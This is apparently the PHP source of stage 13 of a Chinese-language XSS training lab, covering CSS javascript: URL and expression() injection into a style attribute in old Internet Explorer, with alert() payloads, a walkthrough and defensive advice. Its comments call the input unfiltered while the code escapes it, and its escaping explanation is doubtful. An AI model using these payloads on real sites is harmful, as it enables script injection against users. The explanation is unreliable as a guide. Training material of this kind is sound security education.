<?php
/**
 * XSS Challenges - Stage #13
 * CSS javascript伪协议注入
 *
 * 漏洞成因：
 *   用户输入拼接到 input 标签的 style 属性中
 *   经过 htmlspecialchars 转义，双引号被转义为 &quot;，但由于 HTML 解析特性，
 *   部分 IE 浏览器在 style 标签内容中仍会将 &quot; 解析为引号，
 *   故可配合 CSS 注释绕过或利用 HTML 解析差异执行 JS（仅 IE）
 *
 * 通关 Payload（仅 IE 可解）：
 *   background:url("javascript:alert(document.domain);");
 */

// 获取参数（无过滤）
$p1 = isset($_GET['p1']) && $_GET['p1'] !== '' ? $_GET['p1'] : 'background:salmon';
$searched = isset($_GET['p1']);
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=7">
  <title>XSS Challenges - Stage #13</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="site-header clearfix">
  <a class="logo" href="../../index.php">极客事纪 XSS<span>·</span>Challenges靶场</a>
  <div class="site-nav"><a href="../../index.php">首页</a></div>
  <!--[if IE]><div style="clear:both;height:0;overflow:hidden"></div><![endif]-->
</div>

<div class="stage-banner">
  <span class="stage-badge">STAGE #13</span>
  <h1>CSS javascript伪协议注入</h1>
  <span class="difficulty">难度：★★★★★ 专家</span>
</div>

<div class="site-main">
  <div class="task-card">
    <h2>任务目标</h2>
    <p>在搜索框中注入 XSS 代码，使页面弹出 <code>alert</code> 对话框，内容显示当前页面的 <strong>document.domain</strong>。<br>表单参数名为 <code style="color:#e94560;">p1</code>，通过 GET 方式提交。</p>
    <div class="hint">💡 提示（选中以下文字查看）：<span class="hint-content">p1 被直接输出到 input 标签的 style 属性中，无任何过滤。尝试使用 CSS 的 background:url("javascript:...") 伪协议（仅 IE 有效）。</span></div>
  </div>

  <div class="lab-area">
    <h2>🔍 靶场第十三关</h2>
    <?php if ($searched): ?>
    <div class="url-bar">GET <?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8'); ?>?<span class="url-key">p1</span>=<span class="url-val"><?php echo htmlspecialchars($p1, ENT_QUOTES, 'UTF-8'); ?></span></div>
    <?php endif; ?>
    <form class="search-form" method="GET" action="">
      <input type="text" name="p1" style="<?php echo htmlspecialchars($p1, ENT_QUOTES, 'UTF-8'); ?>" value="<?php echo htmlspecialchars($p1, ENT_QUOTES, 'UTF-8'); ?>" />
      <button type="submit">搜索</button>
    </form>
  </div>

  <div class="knowledge-section">
    <button class="knowledge-toggle" onclick="this.parentElement.classList.toggle('expanded')">
      <span class="toggle-icon">▶</span> 知识点解析
    </button>
    <div class="knowledge-content">

    <div class="knowledge-item">
      <h3>1. 后端 PHP 漏洞代码</h3>
      <p>服务端将用户输入 <code>p1</code> 拼接到 input 标签的 <code>style</code> 和 <code>value</code> 属性中，两个属性均使用 <code>htmlspecialchars</code> 转义，<code>"</code> → <code>&amp;quot;</code>、<code>&gt;</code> → <code>&amp;gt;</code>，但由于 IE 浏览器在 style 标签内容中仍会将 <code>&amp;quot;</code> 解析为引号，配合 CSS <code>javascript:</code> 伪协议仍可执行 JS（仅 IE）：</p>
      <div class="code-block"><span class="hl-php">&lt;?php</span>
<span class="hl-comment">// 获取参数</span>
<span class="hl-var">$p1</span> <span class="hl-php">=</span> <span class="hl-var">$_GET</span>[<span class="hl-str">'p1'</span>];
<span class="hl-php">?&gt;</span>

<span class="hl-comment">&lt;!-- style 和 value 均使用 htmlspecialchars 转义 --&gt;</span>
<span class="hl-tag">&lt;input</span> <span class="hl-attr">type</span>=<span class="hl-val">"text"</span> <span class="hl-attr">style</span>=<span class="hl-val">"&lt;?php echo htmlspecialchars($p1, ENT_QUOTES, 'UTF-8'); ?&gt;"</span> <span class="hl-attr">value</span>=<span class="hl-val">"&lt;?php echo htmlspecialchars($p1, ENT_QUOTES, 'UTF-8'); ?&gt;"</span> <span class="hl-tag">/&gt;</span></div>
      <p>当用户输入 <code>background:url("javascript:alert(document.domain);");</code> 时，输出为：</p>
      <div class="code-block"><span class="hl-tag">&lt;input</span> <span class="hl-attr">type</span>=<span class="hl-val">"text"</span> <span class="hl-attr">style</span>=<span class="hl-val">"background:url(&amp;quot;javascript:alert(document.domain);&amp;quot;);"</span> <span class="hl-tag">/&gt;</span></div>
    </div>

    <div class="knowledge-item">
      <h3>2. CSS 中的 javascript: 伪协议</h3>
      <p>在 CSS 的 <code>url()</code> 函数中，IE 浏览器支持使用 <code>javascript:</code> 伪协议：</p>
      <div class="code-block"><span class="hl-comment">/* 正常用法 — 加载图片 */</span>
<span class="hl-tag">background:</span> <span class="hl-fn">url</span>(<span class="hl-val">"https://example.com/bg.png"</span>);

<span class="hl-comment">/* IE 特有 — 执行 JavaScript */</span>
<span class="hl-tag">background:</span> <span class="hl-fn">url</span>(<span class="hl-val">"javascript:alert(document.domain)"</span>);</div>
      <p>IE6/IE7 在解析 CSS 的 <code>url()</code> 函数时，会将 <code>javascript:</code> 协议的 URL 当作 JavaScript 代码来执行，而不是去加载一个资源。这与 <code>&lt;a href="javascript:..."&gt;</code> 的原理类似，但发生在 CSS 层面。</p>
      <p>由于 <code>background</code> 属性会在元素渲染时立即加载，所以注入的 JavaScript 代码会在<strong>页面加载时自动执行</strong>，不需要用户点击或悬停等交互操作。</p>
    </div>

    <div class="knowledge-item">
      <h3>3. Payload 构造与注入过程</h3>
      <p>通关 Payload：</p>
      <div class="code-block">stage13.php?p1=<span class="hl-inject">background:url("javascript:alert(document.domain);");</span></div>
      <p>服务端处理（经过 htmlspecialchars 转义）：</p>
      <div class="code-block"><span class="hl-comment">// 原始输入</span>
<span class="hl-var">$p1</span> = <span class="hl-str">'background:url("javascript:alert(document.domain);");'</span>;

<span class="hl-comment">// htmlspecialchars 转义后：" → &amp;quot;，&gt; → &amp;gt;</span>
<span class="hl-var">$p1</span> = <span class="hl-str">'background:url(&amp;quot;javascript:alert(document.domain);&amp;quot;);'</span>;</div>
      <p>最终 HTML 输出（IE 解析 <code>&amp;quot;</code> 为引号后可执行 JS）：</p>
      <div class="code-block"><span class="hl-tag">&lt;input</span> <span class="hl-attr">type</span>=<span class="hl-val">"text"</span> <span class="hl-attr">style</span>=<span class="hl-val">"background:url(&amp;quot;javascript:alert(document.domain);&amp;quot;);"</span> <span class="hl-tag">/&gt;</span></div>
      <p>IE 浏览器渲染此元素时，会执行 <code>alert(document.domain)</code>，弹出当前域名。</p>
    </div>

    <div class="knowledge-item">
      <h3>4. 为什么 style 属性注入特别危险？</h3>
      <p>与其他 XSS 注入点相比，style 属性注入有几个独特之处：</p>
      <ul>
        <li><strong>自动执行：</strong><code>background:url()</code> 在元素渲染时就会加载，不需要用户交互（与 <code>onmouseover</code> 不同）</li>
        <li><strong>隐蔽性强：</strong>攻击代码隐藏在 CSS 样式中，普通用户和简单的 XSS 检测工具很难发现</li>
        <li><strong>广泛适用：</strong>任何 HTML 元素都可以设置 style 属性，不只是 input</li>
      </ul>
      <p>除了 <code>background:url("javascript:...")</code> 外，IE 还支持以下 CSS 注入方式：</p>
      <div class="code-block"><span class="hl-comment">/* CSS expression() — 另一种 IE 特有的 JS 执行方式 */</span>
<span class="hl-tag">width:</span> <span class="hl-fn">expression</span>(<span class="hl-js">alert(document.domain)</span>);

<span class="hl-comment">/* list-style-image 也支持 javascript: 协议 */</span>
<span class="hl-tag">list-style-image:</span> <span class="hl-fn">url</span>(<span class="hl-val">"javascript:alert(1)"</span>);</div>
    </div>

    <div class="knowledge-item">
      <h3>5. 安全防御建议</h3>
      <p>永远不要将用户输入直接拼接到 style 属性中。正确做法：</p>
      <div class="code-block"><span class="hl-php">&lt;?php</span>
<span class="hl-comment">// 方案一：完全禁止用户控制 CSS</span>
<span class="hl-comment">// 不要将任何用户输入放入 style 属性</span>

<span class="hl-comment">// 方案二：如果必须动态设置样式，通过 class 切换而非内联样式</span>
<span class="hl-php">echo</span> <span class="hl-str">'&lt;input class="'</span> . <span class="hl-php">htmlspecialchars</span>(<span class="hl-var">$userClass</span>) . <span class="hl-str">'" /&gt;'</span>;

<span class="hl-comment">// 方案三：白名单校验（仅允许特定颜色值）</span>
<span class="hl-var">$allowed</span> = <span class="hl-fn">preg_match</span>(<span class="hl-str">'/^[a-f0-9#]{3,8}$/i'</span>, <span class="hl-var">$p1</span>) ? <span class="hl-var">$p1</span> : <span class="hl-str">'inherit'</span>;
<span class="hl-php">?&gt;</span></div>
    </div>

    <div class="knowledge-item">
      <h3>互动思考 💬</h3>
      <p><strong>问：</strong>现代浏览器为什么不再支持 CSS 中的 <code>javascript:</code> 伪协议？</p>
      <p><strong>答：</strong>现代浏览器从根源上禁止了 CSS 解析器执行 JavaScript。W3C 规范明确 <code>url()</code> 函数只能加载资源，不能执行脚本。Chrome、Firefox、Edge 等现代浏览器会直接忽略 <code>javascript:</code> 协议的 CSS URL，不会执行任何代码。这是浏览器安全模型的一个重要改进。</p>
    </div>
  </div>
</div>

<div class="site-footer"> 极客事纪 XSS Challenges靶场 &nbsp;·&nbsp; 仅供 <span>安全学习</span> 使用 </div>
</body>
</html>
